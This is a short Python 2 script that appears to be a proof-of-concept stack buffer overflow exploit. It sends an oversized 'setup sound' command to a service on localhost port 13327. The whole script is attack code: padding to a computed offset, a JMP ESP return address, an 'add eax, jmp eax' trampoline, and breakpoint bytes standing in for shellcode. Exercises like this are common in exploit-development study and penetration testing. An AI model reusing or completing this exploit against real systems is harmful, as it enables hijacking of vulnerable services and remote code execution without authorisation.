#!/usr/bin/python
import socket
import struct

RHOST = "127.0.0.1"
RPORT = 13327

total = 4379
offset = 4368

jmpesp = struct.pack("<I", 0x08134596)

# add eax,12 + jmp eax
jmpeax = "\x83\xc0\x0c" + "\xff\xe0"

crash = ""
crash = "\xCC" * 4
crash += "\x41" * (offset - len(crash))
crash += jmpesp
crash += jmpeax
crash += "\x43" * (total - len(crash))
buf = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[*]Sending evil buffer..."
s.connect((RHOST, RPORT))
data = s.recv(1024)
print data

s.send(buf)
s.close()
print "[*]Payload Sent!"
